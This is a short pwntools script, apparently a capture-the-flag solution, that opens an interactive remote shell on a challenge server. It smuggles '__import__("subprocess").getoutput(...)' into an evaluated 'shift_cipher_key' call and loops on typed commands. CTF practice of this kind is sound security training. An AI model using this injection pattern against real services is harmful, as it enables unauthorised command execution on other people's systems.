from pwn import *

HOST = "chall.csivit.com"
PORT = 30419

def shell(arg):
    try:
        conn = remote(HOST, PORT)
        r = conn.recv(1024).decode()
        command = ''

        while command != "exit":
            if not arg:
                command = input("> ").replace('\n', '')
            else:
                command = arg
                arg = ''

            conn.send('shift_cipher_key(__import__("subprocess").getoutput("'+ command +'"), 0)' + '\r\n')
            r = conn.recv(1024*10).decode().split(" with shift 0 is ")[0].split("\x1bc\n\x1bc\nThe text '")[1][:-1]
            print(r, '\n')
    except Exception as e:
        print("Connection lost. Restarting ...")
        return shell(command)

shell(None)
